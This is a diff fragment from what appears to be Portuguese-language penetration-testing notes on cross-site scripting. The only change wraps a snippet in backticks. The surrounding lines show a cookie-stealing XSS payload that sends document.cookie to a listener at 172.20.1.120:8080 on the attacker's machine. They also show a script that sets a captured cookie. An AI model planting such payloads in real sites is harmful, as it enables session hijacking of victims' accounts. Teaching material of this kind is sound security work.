@@ -3918,7 +3918,7 @@ Ao identificar este campo, pode-se abrir um serviço http via python e enviar um
 
     no server: 172.16.1.250 <script>new Image().src="http://172.20.1.120:8080/?="+document.cookie;</script> 
 
-Esse script envia dados para o serviço aberto na máquina do atacante. Na máquina atacante vai chegar o cookie da sessão da máquina vítima, depois adiciona o cookie <script>alert(document.cookie="COOKIECAPT")</script>
+Esse script envia dados para o serviço aberto na máquina do atacante. Na máquina atacante vai chegar o cookie da sessão da máquina vítima, depois adiciona o cookie `<script>alert(document.cookie="COOKIECAPT")</script>`
 
 
 - Automatizando os testes: XSS
